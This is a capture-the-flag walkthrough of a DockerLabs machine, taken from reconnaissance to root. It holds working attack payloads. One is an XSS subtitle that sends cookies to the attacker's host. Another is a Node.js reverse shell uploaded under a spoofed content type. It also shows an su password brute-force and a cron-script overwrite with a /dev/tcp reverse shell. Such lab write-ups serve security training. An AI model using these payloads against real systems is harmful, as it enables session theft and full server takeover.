# IP
172.17.0.2
# Recognition
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/hard/baluhome]
└─$ ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.045 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.050 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1005ms
rtt min/avg/max/mdev = 0.045/0.047/0.050/0.002 ms
```

Device is **discoverable**
# Ports scanning
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/hard/baluhome]
└─$ sudo nmap -sS -sV 172.17.0.2
[sudo] password for codebylauti:
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-13 20:39 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js (Express middleware)
MAC Address: 52:FE:7E:94:47:D3 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds
```

**Web app** running on port 3000
Web appears to be a YouTube clon
# Dir Fuzzing
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/hard/baluhome]
└─$ gobuster dir -u http://172.17.0.2:3000 -w /usr/share/wordlists/dirb/common.txt -x php,html,conf,sh,txt,sql,zip
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:3000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,conf,sh,txt,sql,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
css                  (Status: 301) [Size: 153] [--> /css/]
img                  (Status: 301) [Size: 153] [--> /img/]
inbox                (Status: 302) [Size: 28] [--> /login]
js                   (Status: 301) [Size: 152] [--> /js/]
login                (Status: 200) [Size: 1378]
Login                (Status: 200) [Size: 1378]
profile              (Status: 302) [Size: 28] [--> /login]
register             (Status: 200) [Size: 1456]
search               (Status: 200) [Size: 1055]
Search               (Status: 200) [Size: 1055]
upload               (Status: 302) [Size: 28] [--> /login]
uploads              (Status: 301) [Size: 157] [--> /uploads/]
Progress: 36904 / 36904 (100.00%)
===============================================================
Finished
===============================================================
```
# Bypass Login
Tried SQLI in the login form but failed

Created an account and found an XSS exploit in the subtitle section
``` html
<script>alert()</script>
```

Cookies have HTTPOnly: *false* and Secure: *false*
We can exploit this with the XSS and steal another user's cookies

``` PoC 
WEBVTT

1
00:00:00.000 --> 00:00:05.000
<img src=x onerror="fetch('http://172.17.0.1:5000/?c='+document.cookie)">
```

Got admin cookies
```sh

172.17.0.2 - - [13/Sep/2026 21:18:44] "GET /?c=balutube.sid=s%3AS669ptiNrIkR12-rC68bUJnHUYgmZMWW.XH5IpU1zb1Ki9Uti%2BY1oFig7%2BonaeNoB%2BLtoqKuzLTE HTTP/1.1" 200 -
```

After URL decodification
```

s:S669ptiNrIkR12-rC68bUJnHUYgmZMWW.XH5IpU1zb1Ki9Uti+Y1oFig7+onaeNoB+LtoqKuzLTE
```
# Reverse Shell
Server runs Express. We need to upload a reverse shell payload in *js* 
Upload payload.js in admin section. For that use *burpsuite* to modify Content-type: image/png instead of Content-type: application/x-javascript.

PoC
```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(4444, "172.17.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/hard/baluhome]
└─$ sudo nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 41488
whoami
www-data
```

Got a nice terminal
```sh
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@d9f83c1b64d5:/home$ ^Z
zsh: suspended  sudo nc -lvnp 4444

┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/hard/baluhome]
└─$ stty raw -echo; fg
[1]  + continued  sudo nc -lvnp 4444
                                    reset xterm

www-data@d9f83c1b64d5:/home$ export SHE=bash
www-data@d9f83c1b64d5:/home$ export TERM=xterm
```
# Pivoting
Found out there's an user: *balutin*

Brute force su balutin
https://github.com/Maalfer/Sudo_BruteForce/tree/83b51341975edef4c1851d583472ed252810a648

```sh
python3 brute.py balutin rockyou.txt
Contraseña encontrada para el usuario balutin: 123123
```

# Privilege Escalation 
Found an automated backup which script we have group permissions
```sh
balutin@d9f83c1b64d5:/opt/balutube-backup$ ls -la
total 12
drwxr-xr-x 1 root root          4096 Jul 15 08:21 .
drwxr-xr-x 1 root root          4096 Jul 15 08:21 ..
-rwxrwx--- 1 root mantenimiento  758 Jul 14 14:57 backup.sh
balutin@d9f83c1b64d5:/opt/balutube-backup$ id
uid=1001(balutin) gid=1002(balutin) groups=1002(balutin),1001(mantenimiento)
```

Set payload
```sh
printf '%s\n' '#!/bin/bash' 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1' > backup.sh 
```

```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/hard/baluhome]
└─$ sudo nc -lvnp 443
[sudo] password for codebylauti:
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 44116
bash: cannot set terminal process group (63067): Inappropriate ioctl for device
bash: no job control in this shell
root@d9f83c1b64d5:~# whoami
whoami
root
```